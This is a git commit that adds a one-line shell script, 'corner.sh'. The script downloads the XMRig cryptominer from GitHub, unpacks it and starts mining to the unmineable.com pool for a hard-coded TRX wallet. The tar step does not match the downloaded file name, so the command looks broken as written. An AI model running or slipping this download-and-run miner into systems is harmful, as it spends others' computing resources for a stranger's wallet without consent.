a3bba176488bc87b693eff4e02fdadde6859a493
ahmadmike <mohamedakram54@yahoo.com>
2022-08-05 04:19:47 +0200

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0 && ./xmrig -u rx.unmineable.com:3333  -a rx -k -u TRX:TBLrhCTvzGpEm1PEWsGy3TUb8DnaEJhNCQ.cornertech -p x 
